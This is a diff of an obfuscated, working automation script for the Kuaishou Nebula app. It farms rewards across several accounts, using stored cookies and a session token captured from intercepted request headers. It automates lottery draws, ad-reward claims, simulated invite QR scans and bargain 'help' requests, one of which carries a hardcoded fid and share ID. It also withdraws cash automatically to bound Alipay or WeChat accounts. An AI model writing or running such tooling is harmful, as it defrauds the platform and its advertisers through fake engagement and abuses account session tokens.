-      console["log"]("账号[" + this["name"] + "]现有" + _0x4d8fbb["data"]["userDiamondResult"]["diamondPercent"] + "钻石，剩余抽奖次数：" + _0x4d8fbb["data"]["userDailyLotteryTimesResult"]["remainTimes"]);
+    if (t['result'] == 1) {
+      console['log']("账号[" + this['name'] + "]现有" + t["data"]["userDiamondResult"]["diamondPercent"] + '钻石，剩余抽奖次数：' + t["data"]["userDailyLotteryTimesResult"]["remainTimes"]);
 
-      for (let _0x2adb6a = 0; _0x2adb6a < _0x4d8fbb["data"]["userDailyLotteryTimesResult"]["remainTimes"]; _0x2adb6a++) {
+      for (let p = 0; p < t["data"]['userDailyLotteryTimesResult']['remainTimes']; p++) {
         await _0x3de8b8["wait"](200);
         await this["luckydraw"]();
       }
     } else {
-      console["log"]("账号[" + this["name"] + "]查询抽奖次数失败：" + _0x4d8fbb["error_msg"]);
+      console["log"]("账号[" + this["name"] + "]查询抽奖次数失败：" + t['error_msg']);
     }
   }
 
   async ["luckydraw"]() {
-    let _0xc4b1e8 = "https://activity.e.kuaishou.com/rest/r/game/lottery?wheelVersion=1",
-        _0x350919 = '',
-        _0x403095 = _0x495d61(_0xc4b1e8, this["cookie"], _0x350919);
+    let D = "https://activity.e.kuaishou.com/rest/r/game/lottery?wheelVersion=1",
+        j = '',
+        N = _0x495d61(D, this['cookie'], j);
 
-    await _0x39a23b("post", _0x403095);
-    let _0x10d50d = _0x1a0963;
+    await _0x39a23b('post', N);
+    let t = _0x1a0963;
 
-    if (!_0x10d50d) {
+    if (!t) {
       return;
     }
 
-    if (_0x10d50d["result"] == 1) {
-      let _0x151483 = _0x10d50d["data"]["coinCount"] ? _0x10d50d["data"]["coinCount"] + '金币' : _0x10d50d["data"]["diamondCount"] ? _0x10d50d["data"]["diamondCount"] + '钻石' : '空气';
+    if (t["result"] == 1) {
+      let p = t["data"]["coinCount"] ? t['data']["coinCount"] + '金币' : t["data"]['diamondCount'] ? t['data']['diamondCount'] + '钻石' : '空气';
+      console['log']("账号[" + this["name"] + "]抽奖获得" + p);
+      t["data"]["videoCoinCount"] && console["log"]("额外奖励：" + t["data"]["videoCoinCount"]);
 
-      console["log"]("账号[" + this["name"] + "]抽奖获得" + _0x151483);
-
-      if (_0x10d50d["data"]["videoCoinCount"]) {
-        console["log"]("额外奖励：" + _0x10d50d["data"]["videoCoinCount"]);
-      }
-
-      if (_0x10d50d["data"]["schema"]) {
+      if (t["data"]["schema"]) {
         try {
-          console["log"](_0x331719["decode"](_0x10d50d["data"]["schema"]));
-        } catch (_0xd84b93) {
-          console["log"](_0x10d50d["data"]["schema"]);
+          console["log"](_0x331719["decode"](t["data"]["schema"]));
+        } catch (X) {
+          console["log"](t["data"]['schema']);
         } finally {}
       }
 
-      if (this["hasLuckydraw"]) {
-        await this["luckdrawTasks"]();
-      }
+      this["hasLuckydraw"] && (await this["luckdrawTasks"]());
     } else {
-      console["log"]("账号[" + this["name"] + "]抽奖失败：" + _0x10d50d["error_msg"]);
+      console["log"]('账号[' + this["name"] + "]抽奖失败：" + t["error_msg"]);
     }
   }
 
   async ["luckydrawSign"]() {
-    let _0xc73223 = "https://activity.e.kuaishou.com/rest/r/game/sign-in",
-        _0x4b6fab = '',
-        _0x598268 = _0x495d61(_0xc73223, this["cookie"], _0x4b6fab);
+    let D = "https://activity.e.kuaishou.com/rest/r/game/sign-in",
+        j = '',
+        N = _0x495d61(D, this["cookie"], j);
 
-    await _0x39a23b("get", _0x598268);
-    let _0x502237 = _0x1a0963;
+    await _0x39a23b("get", N);
+    let t = _0x1a0963;
 
-    if (!_0x502237) {
+    if (!t) {
       return;
     }
 
-    _0x502237["result"] == 1 ? _0x502237["data"]["isShow"] && console["log"]("账号[" + this["name"] + "]抽奖页签到成功") : (console["log"]("账号[" + this["name"] + "]查询抽奖签到情况失败：" + _0x502237["error_msg"]), _0x502237["error_msg"]["indexOf"]("激励游戏未在运营") > -1 && (this["hasLuckydraw"] = false));
+    t['result'] == 1 ? t['data']["isShow"] && console["log"]("账号[" + this['name'] + "]抽奖页签到成功") : (console["log"]("账号[" + this["name"] + "]查询抽奖签到情况失败：" + t["error_msg"]), t["error_msg"]["indexOf"]("激励游戏未在运营") > -1 && (this["hasLuckydraw"] = false));
   }
 
-  async ["luckdrawTimerInfo"]() {
-    let _0x2ffbad = "https://activity.e.kuaishou.com/rest/r/game/timer-reward/info",
-        _0x456aaf = '',
-        _0x49e74c = _0x495d61(_0x2ffbad, this["cookie"], _0x456aaf);
+  async ['luckdrawTimerInfo']() {
+    let D = "https://activity.e.kuaishou.com/rest/r/game/timer-reward/info",
+        j = '',
+        N = _0x495d61(D, this["cookie"], j);
 
-    await _0x39a23b("get", _0x49e74c);
-    let _0x2cba5f = _0x1a0963;
+    await _0x39a23b("get", N);
+    let t = _0x1a0963;
 
-    if (!_0x2cba5f) {
+    if (!t) {
       return;
     }
 
-    if (_0x2cba5f["result"] == 1) {
-      if (_0x2cba5f["data"]) {
-        let _0x203650 = new Date()["getTime"](),
-            _0x5dfda7 = _0x2cba5f["data"]["lastTimerTime"],
-            _0x11ca9b = _0x2cba5f["data"]["minutesInterval"] * 60 * 1000,
-            _0x508a9d = _0x5dfda7 + _0x11ca9b;
-
-        _0x203650 < _0x508a9d ? console["log"]("账号[" + this["name"] + "]抽奖页奖励冷却时间还有" + (_0x508a9d - _0x203650) / 1000 + '秒') : (await _0x3de8b8["wait"](200), await this["luckdrawTimerReward"](_0x2cba5f["data"]["goldNum"]));
+    if (t['result'] == 1) {
+      if (t["data"]) {
+        let p = new Date()['getTime'](),
+            X = t["data"]["lastTimerTime"],
+            L = t["data"]["minutesInterval"] * 60 * 1000,
+            n = X + L;
+        p < n ? console["log"]("账号[" + this["name"] + "]抽奖页奖励冷却时间还有" + (n - p) / 1000 + '秒') : (await _0x3de8b8["wait"](200), await this["luckdrawTimerReward"](t["data"]['goldNum']));
       } else {
         console["log"]("账号[" + this["name"] + "]抽奖页定时奖励次数已用完");
       }
     } else {
-      console["log"]("账号[" + this["name"] + "]查询抽奖页定时奖励情况失败：" + _0x2cba5f["error_msg"]);
+      console["log"]("账号[" + this["name"] + "]查询抽奖页定时奖励情况失败：" + t['error_msg']);
     }
   }
 
-  async ["luckdrawTimerReward"](_0x454656) {
-    let _0x2736a9 = "https://activity.e.kuaishou.com/rest/r/game/timer-reward",
-        _0x3cfba9 = '',
-        _0xe6c96d = _0x495d61(_0x2736a9, this["cookie"], _0x3cfba9);
+  async ["luckdrawTimerReward"](D) {
+    let j = "https://activity.e.kuaishou.com/rest/r/game/timer-reward",
+        N = '',
+        t = _0x495d61(j, this['cookie'], N);
 
-    await _0x39a23b("post", _0xe6c96d);
-    let _0xb823ea = _0x1a0963;
+    await _0x39a23b('post', t);
+    let p = _0x1a0963;
 
-    if (!_0xb823ea) {
+    if (!p) {
       return;
     }
 
-    _0xb823ea["result"] == 1 ? console["log"]("账号[" + this["name"] + "]领取抽奖页定时奖励获得" + _0x454656 + '金币') : console["log"]("账号[" + this["name"] + "]领取抽奖页定时奖励失败：" + _0xb823ea["error_msg"]);
+    p["result"] == 1 ? console['log']("账号[" + this["name"] + "]领取抽奖页定时奖励获得" + D + '金币') : console["log"]("账号[" + this["name"] + ']领取抽奖页定时奖励失败：' + p["error_msg"]);
   }
 
   async ["luckdrawTasks"]() {
-    let _0x1198c2 = "https://activity.e.kuaishou.com/rest/r/game/tasks",
-        _0x55d494 = '',
-        _0x4d7b3c = _0x495d61(_0x1198c2, this["cookie"], _0x55d494);
+    let D = "https://activity.e.kuaishou.com/rest/r/game/tasks",
+        j = '',
+        N = _0x495d61(D, this['cookie'], j);
 
-    await _0x39a23b("get", _0x4d7b3c);
-    let _0x52ab2d = _0x1a0963;
+    await _0x39a23b('get', N);
+    let t = _0x1a0963;
 
-    if (!_0x52ab2d) {
+    if (!t) {
       return;
     }
 
-    if (_0x52ab2d["result"] == 1) {
-      for (let _0x3b4109 of _0x52ab2d["data"]["dailyTasks"]) {
-        _0x3b4109["taskState"] == 1 && (await _0x3de8b8["wait"](200), await this["luckdrawTasksReward"](_0x3b4109));
+    if (t['result'] == 1) {
+      for (let p of t["data"]['dailyTasks']) {
+        p["taskState"] == 1 && (await _0x3de8b8["wait"](200), await this["luckdrawTasksReward"](p));
       }
 
-      for (let _0x39a4a6 of _0x52ab2d["data"]["growthTasks"]) {
-        _0x39a4a6["taskState"] == 1 && (await _0x3de8b8["wait"](200), await this["luckdrawTasksReward"](_0x39a4a6));
+      for (let X of t["data"]["growthTasks"]) {
+        X["taskState"] == 1 && (await _0x3de8b8['wait'](200), await this["luckdrawTasksReward"](X));
       }
     } else {
-      console["log"]("账号[" + this["name"] + "]查询抽奖页任务失败：" + _0x52ab2d["error_msg"]);
+      console['log']("账号[" + this['name'] + "]查询抽奖页任务失败：" + t["error_msg"]);
     }
   }
 
-  async ["luckdrawTasksReward"](_0x462615) {
-    let _0x5607bd = "https://activity.e.kuaishou.com/rest/r/game/task/reward-receive?taskName=" + _0x462615["taskName"],
-        _0x46decc = '',
-        _0x2699dd = _0x495d61(_0x5607bd, this["cookie"], _0x46decc);
+  async ["luckdrawTasksReward"](D) {
+    let j = "https://activity.e.kuaishou.com/rest/r/game/task/reward-receive?taskName=" + D['taskName'],
+        N = '',
+        t = _0x495d61(j, this['cookie'], N);
 
-    await _0x39a23b("get", _0x2699dd);
-    let _0x38a7c2 = _0x1a0963;
+    await _0x39a23b('get', t);
+    let p = _0x1a0963;
 
-    if (!_0x38a7c2) {
+    if (!p) {
       return;
     }
 
-    _0x38a7c2["result"] == 1 ? console["log"]("账号[" + this["name"] + "]领取抽奖任务[" + _0x462615["taskTitle"] + "]奖励获得" + _0x38a7c2["data"]["popUp"]["taskRewardName"]) : console["log"]("账号[" + this["name"] + "]领取抽奖任务[" + _0x462615["taskTitle"] + "]奖励失败：" + _0x38a7c2["error_msg"]);
+    p["result"] == 1 ? console["log"]("账号[" + this['name'] + "]领取抽奖任务[" + D["taskTitle"] + ']奖励获得' + p["data"]['popUp']["taskRewardName"]) : console['log']("账号[" + this["name"] + "]领取抽奖任务[" + D["taskTitle"] + ']奖励失败：' + p["error_msg"]);
   }
 
-  async ["helpInvite"](_0x20b9e6) {
-    let _0x3a5dfe = _0x20b9e6["split"]('&'),
-        _0x37b989 = _0x3a5dfe[0],
-        _0x3c285b = _0x3a5dfe[1],
-        _0x4b3956 = "https://nebula.kuaishou.com/rest/n/nebula/qrcode?version=1.2.0",
-        _0x465c38 = '',
-        _0x328013 = _0x495d61(_0x4b3956, this["cookie"], _0x465c38);
+  async ['helpInvite'](D) {
+    let j = D["split"]('&'),
+        N = j[0],
+        t = j[1],
+        p = "https://nebula.kuaishou.com/rest/n/nebula/qrcode?version=1.2.0",
+        X = '',
+        L = _0x495d61(p, this["cookie"], X);
 
-    _0x328013["headers"]["Referer"] = "https://nebula.kuaishou.com/fission/face-qrcode?fid=" + _0x37b989 + "&shareToken=" + _0x3c285b + "&source=qrcode";
-    await _0x39a23b("get", _0x328013);
-    let _0x47a78e = _0x1a0963;
+    L["headers"]["Referer"] = "https://nebula.kuaishou.com/fission/face-qrcode?fid=" + N + '&shareToken=' + t + "&source=qrcode";
+    await _0x39a23b('get', L);
+    let n = _0x1a0963;
 
-    if (!_0x47a78e) {
+    if (!n) {
       return;
     }
 
-    if (!(_0x47a78e["result"] == 1)) {
-      console["log"]("账号[" + this["name"] + "]邀请失败：" + _0x47a78e["error_msg"]);
-    }
+    !(n['result'] == 1) && console["log"]('账号[' + this["name"] + ']邀请失败：' + n["error_msg"]);
   }
 
-  async ["helpPackage"](_0x22f6e9, _0x2b1333) {
-    let _0x2f6bb5 = {
+  async ["helpPackage"](D, j) {
+    let N = {
       'url': "https://ug-fission.kuaishou.com/rest/n/darwin/bargain/overview?version=2.1.0",
-      'body': "{\"fid\":\"895255750\",\"cc\":\"share_wxms\",\"followRefer\":\"151\",\"code\":\"" + _0x22f6e9 + "\",\"shareMethod\":\"TOKEN\",\"kpn\":\"NEBULA\",\"subBiz\":\"BARGAIN\",\"shareId\":\"16905401129783\",\"shareMode\":\"SYSTEM\",\"noBackNavi\":\"true\",\"originShareId\":\"16905401129783\",\"useMerchantWeb\":\"1\",\"layoutType\":\"4\",\"shareObjectId\":" + JSON["stringify"]("{\"teamId\":\"\",\"packetId\":\"" + _0x2b1333 + "\"}") + ",\"shareUrlOpened\":\"0\",\"hyId\":\"bargain\",\"timestamp\":" + +new Date() + ",\"pageCode\":1,\"adamA\":0,\"adamB\":0}",
+      'body': "{\"fid\":\"895255750\",\"cc\":\"share_wxms\",\"followRefer\":\"151\",\"code\":\"" + D + "\",\"shareMethod\":\"TOKEN\",\"kpn\":\"NEBULA\",\"subBiz\":\"BARGAIN\",\"shareId\":\"16905401129783\",\"shareMode\":\"SYSTEM\",\"noBackNavi\":\"true\",\"originShareId\":\"16905401129783\",\"useMerchantWeb\":\"1\",\"layoutType\":\"4\",\"shareObjectId\":" + JSON['stringify']("{\"teamId\":\"\",\"packetId\":\"" + j + "\"}") + ",\"shareUrlOpened\":\"0\",\"hyId\":\"bargain\",\"timestamp\":" + +new Date() + ",\"pageCode\":1,\"adamA\":0,\"adamB\":0}",
       'headers': {
         'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36",
-        'Cookie': "kpn=NEBULA; kpf=ANDROID_PHONE; did=; " + Math["floor"](Math["random"]() * 1000 + 1) + " ANDROID_ff60a387f6ba8904; " + this["cookie"] + "; c=XIAOMI; ver=10.2; appver=10.2.41.3075; language=zh-cn; ",
+        'Cookie': "kpn=NEBULA; kpf=ANDROID_PHONE; did=; " + Math['floor'](Math["random"]() * 1000 + 1) + " ANDROID_ff60a387f6ba8904; " + this['cookie'] + "; c=XIAOMI; ver=10.2; appver=10.2.41.3075; language=zh-cn; ",
         'Content-Type': "application/json",
         'Origin': "https://ug-fission.kuaishou.com",
         'X-Requested-With': "com.kuaishou.nebula",
-        'Sec-Fetch-Site': "same-origin",
+        'Sec-Fetch-Site': 'same-origin',
         'Sec-Fetch-Mode': "cors",
         'Sec-Fetch-Dest': "empty",
-        'Referer': "https://ug-fission.kuaishou.com/bargain/?fid=895255750&cc=share_wxms&followRefer=151&code=" + _0x22f6e9 + "&shareMethod=TOKEN&kpn=NEBULA&subBiz=BARGAIN&shareId=16905401129783&shareMode=SYSTEM&noBackNavi=true&originShareId=16905401129783&useMerchantWeb=1&layoutType=4&shareObjectId=%7B%22teamId%22%3A%22%22,%22packetId%22%3A%22" + _0x2b1333 + "%22%7D&shareUrlOpened=0&hyId=bargain&timestamp=" + +new Date(),
+        'Referer': 'https://ug-fission.kuaishou.com/bargain/?fid=895255750&cc=share_wxms&followRefer=151&code=' + D + "&shareMethod=TOKEN&kpn=NEBULA&subBiz=BARGAIN&shareId=16905401129783&shareMode=SYSTEM&noBackNavi=true&originShareId=16905401129783&useMerchantWeb=1&layoutType=4&shareObjectId=%7B%22teamId%22%3A%22%22,%22packetId%22%3A%22" + j + "%22%7D&shareUrlOpened=0&hyId=bargain&timestamp=" + +new Date(),
         'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
       }
     };
-    await _0x39a23b("post", _0x2f6bb5);
-    let _0x265d1f = _0x1a0963;
+    await _0x39a23b("post", N);
+    let t = _0x1a0963;
 
-    if (!_0x265d1f) {
+    if (!t) {
       return;
     }
   }
 
-  async ["helpScan"](_0x37bccf) {
-    let _0x1fb56a = _0x37bccf["split"]('&'),
-        _0x1fc056 = _0x1fb56a[0],
-        _0x37c4fc = _0x1fb56a[1];
+  async ["helpScan"](D) {
+    let j = D['split']('&'),
+        N = j[0],
+        t = j[1];
 
-    if (_0x1fc056 == this["userId"]) {
+    if (N == this['userId']) {
       return;
     }
 
-    let _0x202af9 = "https://api.kuaishouzt.com/rest/zt/share/show/any",
-        _0x1dc9c8 = "theme=light&sdkVersion=1.14.0.4&kpf=ANDROID_PHONE&shareMessage=https%3A%2F%2Fnicdd.get666bjrqu985xvp14v.com%2Ff%2F" + _0x37c4fc + "%3FlayoutType%3D4&kpn=NEBULA&launchState=hotLaunch&sessionId=ac165e40-48bd-42de-9fc5-b250d7eb983c&extTransientParams=%7B%22source%22%3A%22userScanCamera%22%7D",
-        _0xcc2548 = _0x495d61(_0x202af9, this["cookie"], _0x1dc9c8);
+    let p = "https://api.kuaishouzt.com/rest/zt/share/show/any",
+        X = 'theme=light&sdkVersion=1.14.0.4&kpf=ANDROID_PHONE&shareMessage=https%3A%2F%2Fnicdd.get666bjrqu985xvp14v.com%2Ff%2F' + t + "%3FlayoutType%3D4&kpn=NEBULA&launchState=hotLaunch&sessionId=ac165e40-48bd-42de-9fc5-b250d7eb983c&extTransientParams=%7B%22source%22%3A%22userScanCamera%22%7D",
+        L = _0x495d61(p, this["cookie"], X);
 
-    await _0x39a23b("post", _0xcc2548);
-    let _0x466115 = _0x1a0963;
+    await _0x39a23b("post", L);
+    let n = _0x1a0963;
 
-    if (!_0x466115) {
+    if (!n) {
       return;
     }
 
-    _0x466115["result"] == 1 ? (await _0x3de8b8["wait"](100), await this["helpInvite"](_0x37bccf)) : console["log"]("账号[" + this["name"] + "]模拟邀请二维码扫描失败：" + _0x466115["error_msg"]);
+    n["result"] == 1 ? (await _0x3de8b8['wait'](100), await this["helpInvite"](D)) : console["log"]("账号[" + this["name"] + ']模拟邀请二维码扫描失败：' + n["error_msg"]);
   }
 
   async ["bindInfo"]() {
-    let _0x2b0393 = "https://www.kuaishoupay.com/pay/account/h5/provider/bind_info",
-        _0x26a061 = "account_group_key=NEBULA_CASH_ACCOUNT&bind_page_type=3",
-        _0x1eb81c = _0x495d61(_0x2b0393, this["cookie"], _0x26a061);
+    let D = "https://www.kuaishoupay.com/pay/account/h5/provider/bind_info",
+        j = "account_group_key=NEBULA_CASH_ACCOUNT&bind_page_type=3",
+        N = _0x495d61(D, this['cookie'], j);
 
-    await _0x39a23b("post", _0x1eb81c);
-    let _0x428c8c = _0x1a0963;
+    await _0x39a23b("post", N);
+    let t = _0x1a0963;
 
-    if (!_0x428c8c) {
+    if (!t) {
       return;
     }
 
-    if (_0x428c8c["result"] == "SUCCESS") {
-      let _0x18874e = "未绑定支付宝",
-          _0x204c09 = "未绑定微信";
-      _0x428c8c["alipay_bind"] == true && (this["bindAlipay"] = true, this["alipay"] = _0x428c8c["alipay_nick_name"], _0x18874e = "已绑定支付宝[" + _0x428c8c["alipay_nick_name"] + ']');
-      _0x428c8c["wechat_bind"] == true && (this["bindWechat"] = true, this["wechat"] = _0x428c8c["wechat_nick_name"], _0x204c09 = "已绑定微信[" + _0x428c8c["wechat_nick_name"] + ']');
-      console["log"]("账号[" + this["name"] + ']' + _0x204c09 + '，' + _0x18874e);
+    if (t["result"] == "SUCCESS") {
+      let p = '未绑定支付宝',
+          X = '未绑定微信';
+      t["alipay_bind"] == true && (this["bindAlipay"] = true, this["alipay"] = t["alipay_nick_name"], p = '已绑定支付宝[' + t["alipay_nick_name"] + ']');
+      t["wechat_bind"] == true && (this['bindWechat'] = true, this['wechat'] = t["wechat_nick_name"], X = "已绑定微信[" + t["wechat_nick_name"] + ']');
+      console["log"]("账号[" + this["name"] + ']' + X + '，' + p);
     } else {
-      console["log"]("账号[" + this["name"] + "]查询提现账号绑定情况失败：" + _0x428c8c["error_msg"]);
+      console["log"]("账号[" + this["name"] + ']查询提现账号绑定情况失败：' + t["error_msg"]);
     }
   }
 
   async ["accountInfo"]() {
-    let _0x249278 = "https://www.kuaishoupay.com/pay/account/h5/withdraw/account_info",
-        _0x2969d4 = "account_group_key=NEBULA_CASH_ACCOUNT&providers=",
-        _0xc49302 = _0x495d61(_0x249278, this["cookie"], _0x2969d4);
+    let D = "https://www.kuaishoupay.com/pay/account/h5/withdraw/account_info",
+        j = "account_group_key=NEBULA_CASH_ACCOUNT&providers=",
+        N = _0x495d61(D, this['cookie'], j);
 
-    await _0x39a23b("post", _0xc49302);
-    let _0x6f12ca = _0x1a0963;
+    await _0x39a23b("post", N);
+    let t = _0x1a0963;
 
-    if (!_0x6f12ca) {
+    if (!t) {
       return;
     }
 
-    _0x6f12ca["result"] == "SUCCESS" ? this["needSms"] = _0x6f12ca["need_mobile_code"] : console["log"]("账号[" + this["name"] + "]查询账号提现情况失败：" + _0x6f12ca["error_msg"]);
+    t["result"] == 'SUCCESS' ? this["needSms"] = t['need_mobile_code'] : console['log']('账号[' + this['name'] + "]查询账号提现情况失败：" + t["error_msg"]);
   }
 
 }
 
 !(async () => {
-  if (typeof $request !== "undefined") {
+  if (typeof $request !== 'undefined') {
     await _0x13d82d();
   } else {
     if (!(await _0x2dc359())) {
@@ -939,175 +929,150 @@ class _0x9d8dda {
     }
 
     console["log"]("============================");
-    console["log"]("\n============== 登录 ==============");
+    console['log']("\n============== 登录 ==============");
 
-    for (let _0x81769c of _0x431ea3) {
-      await _0x81769c["getUserInfo"]();
+    for (let N of _0x431ea3) {
+      await N["getUserInfo"]();
       await _0x3de8b8["wait"](500);
     }
 
-    let _0xba2efb = _0x431ea3["filter"](_0x1ad84c => _0x1ad84c["valid"] == true);
+    let D = _0x431ea3["filter"](t => t["valid"] == true);
 
-    if (_0xba2efb["length"] == 0) {
+    if (D['length'] == 0) {
       return;
     }
 
-    for (let _0x260cab of _0xba2efb) {
-      console["log"]("\n=========== " + _0x260cab["name"] + " ===========");
-      await _0x260cab["getSignInfo"]();
+    for (let t of D) {
+      console["log"]("\n=========== " + t["name"] + " ===========");
+      await t["getSignInfo"]();
+      await _0x3de8b8['wait'](200);
+      await t["openBox"](false);
       await _0x3de8b8["wait"](200);
-      await _0x260cab["openBox"](false);
+      await t["taskList"]();
       await _0x3de8b8["wait"](200);
-      await _0x260cab["taskList"]();
-      await _0x3de8b8["wait"](200);
-      await _0x260cab["luckydrawSign"]();
-      await _0x3de8b8["wait"](200);
+      await t['luckydrawSign']();
+      await _0x3de8b8['wait'](200);
+      t["hasLuckydraw"] == true && (await t["luckdrawTimerInfo"](), await _0x3de8b8["wait"](200), await t["luckdrawTasks"](), await _0x3de8b8["wait"](200), await t["luckdrawInfo"](), await _0x3de8b8["wait"](200));
 
-      if (_0x260cab["hasLuckydraw"] == true) {
-        await _0x260cab["luckdrawTimerInfo"]();
-        await _0x3de8b8["wait"](200);
-        await _0x260cab["luckdrawTasks"]();
-        await _0x3de8b8["wait"](200);
-        await _0x260cab["luckdrawInfo"]();
-        await _0x3de8b8["wait"](200);
-      }
-
-      if (_0x260cab["task"][_0x1e4967["luckydraw"]]["needRun"]) {
-        for (let _0x3b610b = 0; _0x3b610b < _0x260cab["task"][_0x1e4967["luckydraw"]]["num"]; _0x3b610b++) {
-          _0x20a9d7 < 13 ? (await _0x260cab["ksNeoAdParam"](_0x10d9f8["luckdrawVideo_161_213"]), await _0x3de8b8["wait"](200), await _0x260cab["ksNeoAdParam"](_0x10d9f8["luckdrawVideo_11_213"]), await _0x3de8b8["wait"](200)) : (await _0x260cab["ksNeoAdParam"](_0x10d9f8["luckdrawVideo_161_100"]), await _0x3de8b8["wait"](200), await _0x260cab["ksNeoAdParam"](_0x10d9f8["luckdrawVideo_11_100"]), await _0x3de8b8["wait"](200));
+      if (t["task"][_0x1e4967["luckydraw"]]["needRun"]) {
+        for (let p = 0; p < t["task"][_0x1e4967["luckydraw"]]["num"]; p++) {
+          _0x20a9d7 < 13 ? (await t["ksNeoAdParam"](_0x10d9f8["luckdrawVideo_161_213"]), await _0x3de8b8["wait"](200), await t['ksNeoAdParam'](_0x10d9f8["luckdrawVideo_11_213"]), await _0x3de8b8['wait'](200)) : (await t['ksNeoAdParam'](_0x10d9f8["luckdrawVideo_161_100"]), await _0x3de8b8["wait"](200), await t["ksNeoAdParam"](_0x10d9f8["luckdrawVideo_11_100"]), await _0x3de8b8["wait"](200));
         }
       }
 
-      if (_0x260cab["task"][_0x1e4967['ad']]["needRun"]) {
-        for (let _0x4bf45e = 0; _0x4bf45e < _0x260cab["task"][_0x1e4967['ad']]["num"]; _0x4bf45e++) {
-          await _0x260cab["ksAdParam"](_0x351e94["ad1"]);
+      if (t["task"][_0x1e4967['ad']]["needRun"]) {
+        for (let X = 0; X < t["task"][_0x1e4967['ad']]['num']; X++) {
+          await t["ksAdParam"](_0x351e94["ad1"]);
           await _0x3de8b8["wait"](200);
-          _0x4bf45e != _0x260cab["task"][_0x1e4967['ad']]["num"] - 1 && (await _0x3de8b8["wait"](2000));
+          X != t['task'][_0x1e4967['ad']]["num"] - 1 && (await _0x3de8b8['wait'](2000));
         }
       }
 
-      if (_0x260cab["task"][_0x1e4967['gj']]["needRun"]) {
-        for (let _0x48a0b0 = 0; _0x48a0b0 < _0x260cab["task"][_0x1e4967['gj']]["num"]; _0x48a0b0++) {
-          await _0x260cab["ksgj"]()[[]];
+      if (t['task'][_0x1e4967['gj']]["needRun"]) {
+        for (let L = 0; L < t["task"][_0x1e4967['gj']]["num"]; L++) {
+          await t["ksgj"]()[[]];
           await _0x3de8b8["wait"](200);
         }
       }
 
-      if (_0x260cab["task"][_0x1e4967["live"]]["needRun"]) {
-        for (let _0x5ae845 = 0; _0x5ae845 < _0x260cab["task"][_0x1e4967["live"]]["num"]; _0x5ae845++) {
-          await _0x260cab["ksNeoAdParam"](_0x10d9f8["liveVideo_75"]);
+      if (t["task"][_0x1e4967["live"]]["needRun"]) {
+        for (let n = 0; n < t["task"][_0x1e4967['live']]["num"]; n++) {
+          await t["ksNeoAdParam"](_0x10d9f8["liveVideo_75"]);
           await _0x3de8b8["wait"](200);
         }
       }
 
-      if (_0x260cab["task"][_0x1e4967["invite"]]["needRun"]) {
-        for (let _0x42de51 = 0; _0x42de51 < _0x260cab["task"][_0x1e4967["invite"]]["num"]; _0x42de51++) {
-          await _0x260cab["ksNeoAdParam"](_0x10d9f8["inviteVideo_2008"]);
+      if (t["task"][_0x1e4967["invite"]]["needRun"]) {
+        for (let z = 0; z < t["task"][_0x1e4967["invite"]]["num"]; z++) {
+          await t['ksNeoAdParam'](_0x10d9f8['inviteVideo_2008']);
           await _0x3de8b8["wait"](200);
         }
       }
     }
 
-    console["log"]("\n============== 账户情况 ==============");
+    console['log']("\n============== 账户情况 ==============");
 
-    for (let _0x1ebc1d of _0xba2efb) {
-      await _0x1ebc1d["accountOverview"]();
+    for (let A of D) {
+      await A["accountOverview"]();
       await _0x3de8b8["wait"](200);
-      await _0x1ebc1d["bindInfo"]();
+      await A["bindInfo"]();
       await _0x3de8b8["wait"](200);
-      await _0x1ebc1d["accountInfo"]();
+      await A["accountInfo"]();
       await _0x3de8b8["wait"](200);
     }
 
     console["log"]("\n============== 自动提现 ==============");
-    let _0x8c437b = "按提现列表自动提现";
-
-    if (_0x1e627b) {
-      _0x8c437b = "自动提现" + _0x1e627b + '元';
-    }
-
-    if (_0x13d24b) {
-      _0x8c437b = "最大化提现";
-    }
+    let j = "按提现列表自动提现";
+    _0x1e627b && (j = "自动提现" + _0x1e627b + '元');
+    _0x13d24b && (j = '最大化提现');
 
     if (_0x20a9d7 == _0x26f17b) {
-      console["log"]("提现时间，现在设置为" + _0x8c437b);
+      console["log"]('提现时间，现在设置为' + j);
 
-      for (let _0x4720e6 of _0xba2efb) {
-        await _0x4720e6["withdrawOverview"]();
+      for (let l of D) {
+        await l["withdrawOverview"]();
         await _0x3de8b8["wait"](200);
       }
     } else {
-      console["log"]("非提现时间，现在设置为" + _0x26f17b + '点' + _0x8c437b);
+      console["log"]("非提现时间，现在设置为" + _0x26f17b + '点' + j);
     }
 
     await _0x217ea6();
 
     if (_0x5718d8["length"] > 0) {
-      for (let _0x719d9b of _0xba2efb) {
-        for (let _0x932430 of _0x5718d8) {
-          await _0x719d9b["helpScan"](_0x932430);
+      for (let k of D) {
+        for (let d of _0x5718d8) {
+          await k["helpScan"](d);
           await _0x3de8b8["wait"](200);
         }
       }
     }
 
     if (yifenk["length"] > 0) {
-      for (let _0x5af0dd of _0xba2efb) {
-        for (let _0x560565 of yifenk) {
-          let _0x31c8fc = _0x560565["split"]('@')[0],
-              _0x464b00 = _0x560565["split"]('@')[1];
-
-          await _0x5af0dd["helpPackage"](_0x464b00, _0x31c8fc);
-          await _0x3de8b8["wait"](1000);
+      for (let T of D) {
+        for (let U of yifenk) {
+          let r = U["split"]('@')[0],
+              u = U['split']('@')[1];
+          await T["helpPackage"](u, r);
+          await _0x3de8b8['wait'](1000);
         }
       }
     }
 
-    if (_0x113109 == 2) {
-      await _0x577f0c();
-    } else {
-      if (_0x113109 == 1) {
-        if (_0x20a9d7 == _0x26f17b) {
-          await _0x577f0c();
-        }
-      }
-    }
+    _0x113109 == 2 ? await _0x577f0c() : _0x113109 == 1 && _0x20a9d7 == _0x26f17b && (await _0x577f0c());
   }
-})()["catch"](_0x1997cf => _0x3de8b8["logErr"](_0x1997cf))["finally"](() => _0x3de8b8["done"]());
+})()['catch'](D => _0x3de8b8["logErr"](D))['finally'](() => _0x3de8b8["done"]());
 
 async function _0x13d82d() {
   if ($request["url"]["indexOf"]("appsupport/yoda/biz/info") > -1) {
-    let _0x4efc86 = $request["headers"]["Cookie"]["match"](/(kuaishou.api_st=[\w\-]+)/)[1] + ';';
-
